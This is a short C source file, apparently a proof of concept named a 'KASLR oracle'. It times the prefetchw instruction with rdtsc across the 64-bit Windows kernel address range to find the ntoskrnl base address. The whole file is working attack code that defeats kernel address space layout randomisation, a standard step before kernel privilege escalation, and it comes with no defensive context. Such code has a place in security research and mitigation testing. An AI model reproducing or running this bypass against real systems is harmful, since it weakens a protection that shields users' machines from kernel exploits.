#include <windows.h>
#include <intrin.h>
#include <stdio.h>

// Fox's quick-and-dirty KASLR oracle
inline int ProbeKernelAddress(void* addr) {
    unsigned __int64 t1, t2;
    int cpuInfo[4];

    // Serialize execution
    __cpuid(cpuInfo, 0);
    t1 = __rdtsc();

    // The magic silent instruction
    _m_prefetchw(addr);

    // Serialize and measure
    __cpuid(cpuInfo, 0);
    t2 = __rdtsc();

    // If it took less than ~150 cycles, the page exists
    return (t2 - t1) < 150;
}

int main() {
    printf("[+] Scanning kernel space...\n");
    // Start of typical 64-bit Windows kernel range
    unsigned char* base = (unsigned char*)0xFFFFF80000000000;
    
    for (int i = 0; i < 0x100000; i++) {
        void* target = base + (i * 0x200000); // 2MB huge pages
        if (ProbeKernelAddress(target)) {
            printf("[!] Found ntoskrnl base at: %p\n", target);
            break;
        }
    }
    return 0;
}